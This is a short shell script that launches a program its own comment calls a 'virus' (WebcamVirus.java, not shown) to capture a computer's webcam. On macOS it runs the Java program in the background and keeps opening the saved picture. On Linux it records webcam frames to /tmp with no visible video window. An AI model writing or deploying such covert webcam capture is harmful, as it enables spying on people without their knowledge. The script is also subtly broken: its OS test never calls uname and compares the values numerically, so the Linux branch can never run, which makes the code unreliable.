
if [[ uname -eq 'Darwin' ]]; then
	VLCPATH='/Applications/VLC.app/Contents/MacOS/lib'
	VLCJPATH='vlcj-2.4.1/jna-3.5.2.jar:vlcj-2.4.1/platform-3.5.2.jar:vlcj-2.4.1/vlcj-2.4.1.jar:.'
	WEBCAM_OSX_PATH='qtcapture://'

	# Compile and run virus
	javac -cp $VLCJPATH WebcamVirus.java
	java -cp $VLCJPATH -Djna.library.path=$VLCPATH WebcamVirus $WEBCAM_OSX_PATH &

	# Open every 3 seconds the new picture
	while [ true ]
	do
		watch -n 3 open saved.png;
	done

elif [[ uname -eq 'Linux' ]]; then
	cvlc v4l2:///dev/video0 --video-filter=scene --vout=dummy --scene-ratio=150 \
			--scene-prefix=img --scene-path=/tmp/ vlc://quit
fi
